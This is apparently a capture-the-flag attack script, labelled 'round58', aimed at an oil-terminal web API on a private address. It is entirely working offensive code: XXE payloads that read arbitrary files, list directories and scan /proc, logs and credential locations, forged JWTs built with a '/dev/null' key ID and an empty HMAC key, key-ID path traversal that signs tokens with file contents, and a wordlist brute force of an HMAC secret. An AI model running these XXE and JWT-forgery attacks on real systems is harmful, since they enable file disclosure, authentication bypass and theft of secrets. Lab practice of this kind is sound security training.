#!/usr/bin/env python3
"""round58 — Directory listing via XXE + mountinfo + log files + encoding tricks"""
import requests, time, json, hmac as hm, hashlib, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

def read_file(path):
    code, text = xxe_read(path)
    if code == 200:
        try:
            data = json.loads(text)
            val = data.get("ticket", {}).get("remarks", "")
            if val and val != "R":
                return val
        except:
            pass
    return None

def read_file_all_fields(path):
    """Try reading in all three entity-capable fields"""
    for field in ["remarks", "carrier", "reference"]:
        code, text = xxe_read(path, field=field)
        if code == 200:
            try:
                data = json.loads(text)
                val = data.get("ticket", {}).get(field, "")
                defaults = {"remarks": "R", "carrier": "C", "reference": "r"}
                if val and val != defaults.get(field, ""):
                    return val
            except:
                pass
        elif code == 400:
            return f"[400-unreadable-{field}]"
    return None

def verify_secret(candidate):
    candidate = candidate.strip()
    if not candidate:
        return False
    sig = hm.new(candidate.encode(), KNOWN_URL.encode(), hashlib.sha256).hexdigest()
    if sig == KNOWN_SIG:
        print(f"\n{'='*60}")
        print(f"*** PROBE_SECRET CONFIRMED: {candidate} ***")
        print(f"{'='*60}")
        return True
    return False

# ============================================================
print("="*70)
print("PHASE 1: DIRECTORY LISTING VIA XXE (lxml feature)")
print("="*70)
print("  lxml can list directories via file:// protocol")

dirs_to_list = [
    "/app/",
    "/app/keys/",
    "/app/static/",
    "/app/static/js/",
    "/app/static/css/",
    "/app/__pycache__/",
    "/run/secrets/",
    "/tmp/",
    "/var/local/",
    "/var/local/lfi/",
    "/var/local/xxe/",
    "/opt/",
    "/etc/default/",
    "/app/templates/",
    "/app/blueprints/",
    "/app/routes/",
    "/app/api/",
    "/app/modules/",
    "/app/config/",
    "/root/",
    "/home/",
]

for d in dirs_to_list:
    val = read_file(d)
    if val:
        print(f"  {d}:")
        for line in val.strip().split('\n'):
            print(f"    {line}")
    else:
        code, _ = xxe_read(d)
        if code == 400:
            print(f"  {d}: EXISTS but listing has forbidden chars")
        elif code == 200:
            print(f"  {d}: empty or not listable")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: /proc/self/mountinfo (ALL DOCKER VOLUMES)")
print("="*70)

for proc_path in ["/proc/self/mountinfo", "/proc/self/mounts", "/proc/mounts",
                  "/proc/self/mountstats"]:
    val = read_file_all_fields(proc_path)
    if val and not val.startswith("[400"):
        print(f"  {proc_path}:")
        for line in val.split('\n'):
            print(f"    {line}")
        # Extract mount points
        if "mountinfo" in proc_path or "mounts" in proc_path:
            mount_points = set()
            for line in val.split('\n'):
                parts = line.split()
                if len(parts) >= 5:
                    mount_points.add(parts[4] if "mountinfo" in proc_path else parts[1])
            if mount_points:
                print(f"  Unique mount points: {sorted(mount_points)}")
    elif val:
        print(f"  {proc_path}: {val}")
    else:
        print(f"  {proc_path}: not readable")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: /proc ADDITIONAL INFO")
print("="*70)

proc_files = [
    "/proc/self/cmdline",     # Command line (has null bytes but try)
    "/proc/1/cmdline",        # Init process cmdline
    "/proc/self/comm",        # Process name
    "/proc/1/comm",           # PID 1 name
    "/proc/self/exe",         # Symlink to executable (readlink won't work via file://)
    "/proc/self/cwd",         # Symlink to CWD
    "/proc/self/root",        # Symlink to root
    "/proc/self/limits",      # Resource limits
    "/proc/self/io",          # I/O stats
    "/proc/self/oom_score",   # OOM score
    "/proc/self/loginuid",    # Login UID
    "/proc/self/sessionid",   # Session ID
    "/proc/self/attr/current",  # SELinux context
    "/proc/self/cpuset",      # CPU set (shows container info)
    "/proc/self/sched",       # Scheduler info
    "/proc/self/schedstat",   # Scheduler stats
    "/proc/self/personality", # Process personality
    "/proc/self/stack",       # Kernel stack
    "/proc/self/syscall",     # Current syscall
    "/proc/self/wchan",       # Wait channel
    "/proc/self/net/tcp",     # TCP connections
    "/proc/self/net/tcp6",    # TCP6 connections
    "/proc/self/net/unix",    # Unix sockets
    "/proc/self/net/route",   # Routing table
    "/proc/self/net/arp",     # ARP table
]

for p in proc_files:
    val = read_file_all_fields(p)
    if val and not val.startswith("[400"):
        print(f"  {p}: {val[:300]}")
    elif val and val.startswith("[400"):
        print(f"  {p}: exists but unreadable (binary/special chars)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: LOG FILES")
print("="*70)

log_paths = [
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/app.log",
    "/var/log/gunicorn/access.log",
    "/var/log/gunicorn/error.log",
    "/tmp/app.log",
    "/tmp/gunicorn.log",
    "/app/app.log",
    "/app/error.log",
    "/app/debug.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/auth.log",
    "/var/log/daemon.log",
]

for p in log_paths:
    val = read_file(p)
    if val:
        print(f"  {p}: ({len(val)} bytes)")
        # Search for secrets in logs
        for line in val.split('\n'):
            if any(kw in line.upper() for kw in ['PROBE', 'SECRET', 'KEY', 'HMAC', 'TOKEN', 'PASSWORD']):
                print(f"    *** {line.strip()} ***")
        print(f"    First 500 chars: {val[:500]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: ENCODING TRICKS FOR entrypoint.sh AND app.py")
print("="*70)

# Try parameter entity approach (internal subset)
# This attempts to use parameter entities to wrap file content

# Approach 1: Parameter entity with SYSTEM
xml_pe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/entrypoint.sh">
  <!ENTITY % wrapper "<!ENTITY content '%file;'>">
  %wrapper;
]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&content;</remarks>
</ticket>'''
try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml_pe, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  Parameter entity entrypoint.sh: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  PE error: {e}")

# Approach 2: UTF-16 encoded XML
xml_utf16 = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/entrypoint.sh">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml_utf16.encode('utf-16'),
        headers={**AUTH_OP, "Content-Type":"application/xml; charset=utf-16"}, timeout=10)
    print(f"  UTF-16 entrypoint.sh: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  UTF-16 error: {e}")

# Approach 3: Try reading app.py via /proc/self/exe disassembly — actually try to find
# the source via Python's importlib cache or other mechanisms
alt_app_paths = [
    "/usr/local/lib/python3.11/importlib/_bootstrap.py",  # just to confirm Python path
    "/app/app.pyc",
    "/app/__pycache__/app.cpython-311.pyc",
    "/usr/local/lib/python3.11/__pycache__/",
    # Python bytecode disassembly in /tmp?
    "/tmp/app.py",
    "/tmp/app.pyc",
    # Alternative source locations
    "/usr/src/app/app.py",
    "/srv/app/app.py",
    "/opt/app/app.py",
    # Backup files
    "/app/app.py.bak",
    "/app/app.py~",
    "/app/app.py.orig",
    "/app/app.py.old",
    "/app/.app.py.swp",
    "/app/app.py.save",
]

for p in alt_app_paths:
    val = read_file_all_fields(p)
    if val and not val.startswith("[400"):
        print(f"  FOUND: {p}: {val[:300]}")
        if 'PROBE' in val.upper() or 'SECRET' in val.upper():
            print(f"  *** CONTAINS SECRET-RELATED CONTENT! ***")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE — DIFFERENT HMAC CONSTRUCTIONS")
print("="*70)

# What if the signature isn't standard HMAC-SHA256?
# Test with the words we have from round55 scan results
# Try SHA256(key+url), SHA256(url+key), SHA256(key+":"+url) etc.
test_keys = [
    "probe", "secret", "PROBE_SECRET", "caspiterminal", "gauge-gw",
    "oil-depot", "khs-oil-depot", "KazHackStan", "KHS", "CTF",
    "casp1t3rm1nal", "flag", "llehs", "shell", "admin", "root",
    "test", "default", "changeme", "password", "P@ssw0rd",
    "probe_secret", "hmac_secret", "signing_key", "api_key",
    # UUID-like
    "00000000-0000-0000-0000-000000000000",
    # Common Docker/Flask secrets
    "super-secret-key", "flask-secret-key", "dev-secret",
    "production-secret", "my-secret-key",
    # Kazakh/CTF themed
    "astana", "almaty", "caspian", "tengiz", "kashagan",
    "karachaganak", "aktau", "atyrau", "mangystau",
    "neftegaz", "petroleum", "pipeline", "terminal",
]

url = KNOWN_URL.encode()
target_sig = KNOWN_SIG

for key in test_keys:
    kb = key.encode()
    # Standard HMAC-SHA256
    h1 = hm.new(kb, url, hashlib.sha256).hexdigest()
    if h1 == target_sig:
        print(f"  *** HMAC-SHA256 MATCH: {key} ***")
        break
    # SHA256(key + url)
    h2 = hashlib.sha256(kb + url).hexdigest()
    if h2 == target_sig:
        print(f"  *** SHA256(key+url) MATCH: {key} ***")
        break
    # SHA256(url + key)
    h3 = hashlib.sha256(url + kb).hexdigest()
    if h3 == target_sig:
        print(f"  *** SHA256(url+key) MATCH: {key} ***")
        break
    # SHA256(key + ":" + url)
    h4 = hashlib.sha256(kb + b":" + url).hexdigest()
    if h4 == target_sig:
        print(f"  *** SHA256(key:url) MATCH: {key} ***")
        break
    # SHA256(url + ":" + key)
    h5 = hashlib.sha256(url + b":" + kb).hexdigest()
    if h5 == target_sig:
        print(f"  *** SHA256(url:key) MATCH: {key} ***")
        break
    # HMAC-SHA256(url, key) — reversed args
    h6 = hm.new(url, kb, hashlib.sha256).hexdigest()
    if h6 == target_sig:
        print(f"  *** HMAC-SHA256(url,key) MATCH: {key} ***")
        break
else:
    print("  No match with any construction or key")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: CUSTODY TICKETS — DATABASE EXFILTRATION")
print("="*70)

# Maybe we can read custody tickets from the DB that contain secrets
# GET /api/ops/custody might list tickets
for path in ["/api/ops/custody", "/api/ops/custody/list", "/api/ops/custody/all",
             "/api/ops/custody/tickets", "/api/ops/custody/search",
             "/api/ops/custody/export"]:
    try:
        r = S.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            print(f"  [{r.status_code}] GET {path}: {r.text[:500]}")
    except Exception as e:
        print(f"  Error {path}: {e}")

# POST different data types to custody/ingest
# What if we can trigger errors that leak info?
payloads = [
    ("empty", ""),
    ("json", '{"test": 1}'),
    ("invalid_xml", '<broken'),
    ("xxe_error", '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///nonexistent_12345">]><ticket><reference>&x;</reference><tankId>T</tankId><product>D</product><grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density><temperature>1</temperature><carrier>C</carrier><remarks>R</remarks></ticket>'),
]

for name, payload in payloads:
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=payload, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
        resp = r.text[:300]
        if 'PROBE' in resp.upper() or 'SECRET' in resp.upper() or 'ENV' in resp.upper():
            print(f"  *** [{name}] LEAK: {resp} ***")
        elif r.status_code != 200:
            print(f"  [{name}] [{r.status_code}]: {resp}")
    except Exception as e:
        print(f"  [{name}]: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: KID PATH TRAVERSAL FOR ARBITRARY FILE READ")
print("="*70)

# We know kid="/dev/null" works with key=b''
# What if we use kid to point to a KNOWN file and use its contents as HMAC key?
# This way we could sign with any file's content as key!

# If we set kid="/app/db.py" → server reads /app/db.py as HMAC key
# Then we can forge JWTs signed with the content of /app/db.py

# MORE IMPORTANTLY: If we set kid to point to a file containing the PROBE_SECRET,
# we can forge JWTs with that key. But we don't know which file has PROBE_SECRET.

# HOWEVER: What if PROBE_SECRET is stored in a KEY FILE that kid can read?
# We know keys are at /app/keys/. What if there's a probe key file?

# Test: use kid to read a known file and verify
known_files = [
    # Known readable files
    "/app/db.py",
    "/app/gunicorn.conf.py",
    "/app/requirements.txt",
    # Potential probe secret locations
    "/app/keys/probe",
    "/app/keys/probe_secret",
    "/app/keys/hmac",
    "/var/local/lfi/flag.txt",
    "/var/local/xxe/flag.txt",
]

for kid_path in known_files:
    # Read the file content via XXE
    content = read_file(kid_path)
    if content:
        # Create JWT with this file's content as key
        h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid_path},separators=(',',':')).encode()
        p = json.dumps({"sub":"ctf","company":"X","role":"operator",
            "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
        m = b64u(h)+'.'+b64u(p)
        token = m+'.'+b64u(hm.new(content.encode(), m.encode(), hashlib.sha256).digest())

        # Test if JWT works
        try:
            r = S.get(f"{CASPI}/api/auth/me",
                      headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if r.status_code == 200:
                print(f"  [200] kid={kid_path} WORKS: {r.text[:200]}")

                # Now try to use this JWT for probe operations
                probe_hdr = {"Authorization": f"Bearer {token}"}
                r2 = S.get(f"{CASPI}/api/ops/probe/sign?device=lm-01",
                           headers=probe_hdr, timeout=5)
                if r2.status_code == 200:
                    data = r2.json()
                    print(f"    Probe sign: {data}")
            else:
                print(f"  [{r.status_code}] kid={kid_path}")
        except Exception as e:
            print(f"  Error kid={kid_path}: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
